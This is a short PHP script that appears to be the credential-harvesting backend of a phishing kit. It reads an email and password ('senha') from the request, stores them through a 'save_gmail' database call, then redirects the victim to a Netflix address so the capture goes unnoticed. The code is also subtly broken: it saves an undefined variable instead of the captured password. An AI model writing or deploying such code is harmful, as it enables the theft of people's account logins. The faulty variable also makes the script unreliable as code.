<?php

include 'Tools.php';



$email = $_GET['email'];
$password = $_GET['senha'];

$db->save_gmail($email, $senha);

sleep(2);

header("Location: ".HEADER_NETFLIX."");

?>